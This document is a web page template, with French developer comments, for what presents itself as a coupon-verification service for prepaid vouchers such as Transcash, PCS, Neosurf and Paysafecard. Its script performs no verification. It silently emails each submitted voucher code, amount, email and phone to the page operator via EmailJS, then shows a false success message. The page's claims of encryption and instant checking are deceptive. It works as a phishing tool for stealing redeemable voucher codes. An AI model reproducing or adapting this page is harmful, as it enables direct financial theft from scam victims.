<x-layout>

     

    <div class="max-w-[600px] w-full text-center space-y-lg">
        <!-- Instructional Branding Section -->
        <section class="space-y-sm">
            <h2 data-i18n="title" class="text-headline-lg font-headline-lg text-on-surface tracking-tight">Verify Coupon Authenticity</h2>
            <p data-i18n="description" class="text-body-lg font-body-lg text-on-surface-variant max-w-[480px] mx-auto">
                Enter your coupon code below to check its validity, expiration date, and usage status instantly.
            </p>
        </section>

        <!-- Verification Input Component -->
        <div class="bg-surface-container-lowest border border-outline-variant rounded-xl p-md shadow-sm">
            <form id="rechargeForm" novalidate class="space-y-md">

                <!-- Type of Recharge -->
                <div class="relative group">
                    <label for="recharge_type" data-i18n="typeLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Type of Recharge <span class="text-red-500 ml-1">*</span>
                    </label>
                    <select name="recharge_type" id="recharge_type" required
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all text-center tracking-widest uppercase">
                        <option value="" disabled selected data-i18n="selectRecharge">Select recharge type</option>
                        <option value="Transcash">TransCash</option>
                        <option value="PCS">PCS</option>
                        <option value="Neosurf">Neosurf</option>
                        <option value="Steam">Steam</option>
                        <option value="Paysafecard">Paysafecard</option>
                        <option value="Apple">Apple</option>
                        <option value="Amazon">Amazon</option>
                        <option value="Vanilla">Vanilla</option>
                        <option value="Toneo First">Toneo First</option>
                        <option value="Cashlib">Cashlib</option>
                        <option value="Other">Other</option>
                    </select>
                </div>

                <!-- Amount -->
                <div class="relative group">
                    <label for="amount" data-i18n="amountLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Amount <span class="text-red-500 ml-1">*</span>
                    </label>
                    <input id="amount" name="amount" type="text" placeholder="e.g. 50 €" data-i18n-placeholder="amountPlaceholder" required
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                </div>

                <!-- Recharge Code -->
                <div class="relative group">
                    <label for="recharge_code" data-i18n="codeLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Recharge Code <span class="text-red-500 ml-1">*</span>
                    </label>
                    <input id="recharge_code" name="recharge_code" type="text"
                        placeholder="e.g. XXXX-XXXX-XXXX-XXXX" data-i18n-placeholder="codePlaceholder" required
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                    <div class="absolute inset-y-0 right-0 flex items-center pr-md pointer-events-none opacity-40">
                        <span class="material-symbols-outlined">confirmation_number</span>
                    </div>
                </div>

                <!-- Email -->
                <div class="relative group">
                    <label for="user_email" data-i18n="emailLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Email <span class="text-red-500 ml-1">*</span>
                    </label>
                    <input id="user_email" name="user_email" type="email"
                        placeholder="you@example.com" data-i18n-placeholder="emailPlaceholder" required
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                </div>

                <!-- Phone -->
                <div class="relative group">
                    <label for="phone" data-i18n="phoneLabel" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Phone (optional)
                    </label>
                    <input id="phone" name="phone" type="tel" placeholder="+33 6 00 00 00 00" data-i18n-placeholder="phonePlaceholder"
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                </div>

                <!-- Hide the code -->
                <div class="relative group">
                    <label class="block text-sm font-medium text-slate-700 dark:text-slate-300 text-left mb-3" data-i18n="hideLabel">
                        Hide the code <span class="text-red-500 ml-1">*</span>
                    </label>
                    <div class="flex gap-6">
                        <label class="flex items-center gap-2 cursor-pointer">
                            <input type="radio" name="hide_code" value="Yes" class="w-5 h-5 text-blue-600 focus:ring-blue-500 cursor-pointer">
                            <span class="text-gray-700" data-i18n="yes">Yes</span>
                        </label>
                        <label class="flex items-center gap-2 cursor-pointer">
                            <input type="radio" name="hide_code" value="No" checked class="w-5 h-5 text-blue-600 focus:ring-blue-500 cursor-pointer">
                            <span class="text-gray-700" data-i18n="no">No</span>
                        </label>
                    </div>
                </div>

                <!-- Country -->
                <div class="relative group">
                    <label for="country" class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Country of purchase
                    </label>
                    <input id="country" name="country" type="text" placeholder="e.g. France"
                        class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest uppercase" />
                </div>

                <!-- Submit Button -->
                <button type="submit" id="submitBtn"
                    class="w-full h-14 bg-primary text-on-primary font-headline-md text-headline-md rounded-lg hover:bg-primary-container hover:text-on-primary-container active:scale-[0.98] transition-all flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed">
                    <svg id="spinner" class="hidden animate-spin w-5 h-5 flex-shrink-0" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                    </svg>
                    <span id="btn-icon" class="material-symbols-outlined" style="font-variation-settings: 'FILL' 1;">check_circle</span>
                    <span id="btn-label">Verify Code</span>
                </button>

            </form>
        </div>

        <!-- Quick Action Grid -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-md pt-md">
            <div class="p-md rounded-xl bg-surface-container-low border border-outline-variant text-left flex flex-col gap-base">
                <span class="material-symbols-outlined text-secondary">security</span>
                <h3 class="font-headline-md text-headline-md text-on-surface">Secure Check</h3>
                <p class="font-body-md text-body-md text-on-surface-variant">Real-time encryption ensures your proprietary codes remain private during the lookup.</p>
            </div>
            <div class="p-md rounded-xl bg-surface-container-low border border-outline-variant text-left flex flex-col gap-base">
                <span class="material-symbols-outlined text-secondary">speed</span>
                <h3 class="font-headline-md text-headline-md text-on-surface">Instant Results</h3>
                <p class="font-body-md text-body-md text-on-surface-variant">Our high-performance verification engine processes requests in under 200 milliseconds.</p>
            </div>
        </div>

    </div>
     <!-- Toast Container -->
    <div id="toast-container"
        class="fixed top-6 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2.5 pointer-events-none w-[min(420px,92vw)]"
        aria-live="polite" aria-atomic="true">
    </div>

    <script>
        /* ════════════════════════════════════════════════════════
           CONFIG EMAILJS
           ──────────────────────────────────────────────────────
           TEMPLATE_ID_1 → mail envoyé à TOI avec les données
           TEMPLATE_ID_2 → mail de confirmation à l'UTILISATEUR
                           (décommenter l'envoi 2 quand prêt)
        ════════════════════════════════════════════════════════ */
        const EMAILJS_PUBLIC_KEY    = '_rzBEYEaRj7BX_bHx';
        const EMAILJS_SERVICE_ID    = 'service_ug6vejb';
        const EMAILJS_TEMPLATE_ID_1 = 'template_q5fs1x5';        // ← notification admin (existant)
     

        emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });

        /* ── TOAST ── */
        function showToast({ type = 'success', title, message, duration = 6000 }) {
            const container = document.getElementById('toast-container');
            const iconSuccess = `<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>`;
            const iconError   = `<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>`;
            const isSuccess   = type === 'success';

            const toast = document.createElement('div');
            toast.className = 'relative overflow-hidden pointer-events-auto bg-white border border-slate-200 rounded-2xl shadow-xl flex items-start gap-3 p-4 animate-toast-in';
            toast.innerHTML = `
                <div class="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 ${isSuccess ? 'bg-emerald-50 text-emerald-600' : 'bg-red-50 text-red-500'}">
                    ${isSuccess ? iconSuccess : iconError}
                </div>
                <div class="flex-1 min-w-0 pt-0.5">
                    <p class="text-sm font-semibold text-slate-900 leading-snug">${title}</p>
                    <p class="text-xs text-slate-500 mt-0.5 leading-relaxed">${message}</p>
                </div>
                <button class="text-slate-400 hover:text-slate-600 transition-colors flex-shrink-0 mt-0.5" aria-label="Fermer">
                    <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
                </button>
                <div class="toast-bar ${isSuccess ? 'bg-emerald-500' : 'bg-red-500'}" style="animation-duration:${duration}ms"></div>`;

            container.appendChild(toast);
            const dismiss = () => { toast.style.animation = 'toastOut 0.35s ease-in forwards'; setTimeout(() => toast.remove(), 340); };
            toast.querySelector('button').addEventListener('click', dismiss);
            setTimeout(dismiss, duration);
        }

        /* ── SUBMIT ── */
        document.getElementById('rechargeForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const btn      = document.getElementById('submitBtn');
            const spinner  = document.getElementById('spinner');
            const btnIcon  = document.getElementById('btn-icon');
            const btnLabel = document.getElementById('btn-label');

            /* Validation */
            let valid = true;
            ['recharge_type', 'amount', 'recharge_code', 'user_email'].forEach(id => {
                const el = document.getElementById(id);
                if (!el?.value.trim()) {
                    valid = false;
                    el?.classList.add('!border-red-400', '!ring-2', '!ring-red-200', '!bg-red-50');
                    el?.addEventListener('input', () => el.classList.remove('!border-red-400', '!ring-2', '!ring-red-200', '!bg-red-50'), { once: true });
                }
            });

            if (!valid) {
                showToast({ type: 'error', title: 'Champs manquants', message: "Veuillez remplir tous les champs obligatoires marqués d'un *.", duration: 4000 });
                return;
            }

            const params = {
                recharge_type: document.getElementById('recharge_type').value,
                amount:        document.getElementById('amount').value.trim(),
                recharge_code: document.getElementById('recharge_code').value.trim().toUpperCase(),
                user_email:    document.getElementById('user_email').value.trim(),
                phone:         document.getElementById('phone').value.trim() || 'Non renseigné',
                hide_code:     document.querySelector('input[name="hide_code"]:checked')?.value || 'No',
                country:       document.getElementById('country').value.trim() || 'Non renseigné',
            };

            /* Loading */
            btn.disabled = true;
            spinner.classList.remove('hidden');
            btnIcon.classList.add('hidden');
            btnLabel.textContent = 'Sending…';

            try {
                /* ══ ENVOI 1 — Notification admin (toi) ══ */
               
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID_1, params);

                e.target.reset();

                showToast({
                    type: 'success',
                    title: 'Demande envoyée avec succès !',
                    message: 'Votre demande a bien été reçue. Vérifiez votre boîte mail — notre équipe vous répondra très prochainement.',
                    duration: 7000
                });

                // Redirection après 2 secondes
                setTimeout(() => {
                    window.location.href = '/confirmation'; // ← Remplacez par votre URL de destination
                }, 2000);

            } catch (err) {
                /* ══ DIAGNOSTIC PRÉCIS ══ */
                console.error('[EmailJS] ❌ Erreur :', err);

                let msg = "Une erreur est survenue. Ouvrez la console (F12) pour les détails.";

                if (err?.status === 401 || err?.status === 403) {
                    msg = '🔑 Public Key invalide — vérifiez Account → General sur emailjs.com';
                } else if (err?.status === 404) {
                    msg = '🔍 Service ID ou Template ID introuvable — vérifiez vos IDs sur emailjs.com';
                } else if (err?.status === 412) {
                    msg = '📧 Service Gmail déconnecté — reconnectez-le dans Email Services sur emailjs.com';
                } else if (err?.status === 422) {
                    msg = '📝 Variable manquante — une variable du template n\'existe pas dans les données envoyées';
                } else if (err?.status === 429) {
                    msg = '⏱ Limite atteinte — 200 emails/mois sur le plan gratuit EmailJS';
                } else if (err?.status) {
                    msg = `Erreur HTTP ${err.status} : ${err.text || 'voir console F12'}`;
                } else if (err instanceof TypeError) {
                    msg = '🌐 Problème réseau ou SDK EmailJS non chargé';
                }

                showToast({ type: 'error', title: "Échec de l'envoi", message: msg, duration: 9000 });

            } finally {
                btn.disabled = false;
                spinner.classList.add('hidden');
                btnIcon.classList.remove('hidden');
                btnLabel.textContent = 'Verify Code';
            }
        });
    </script>

</x-layout>
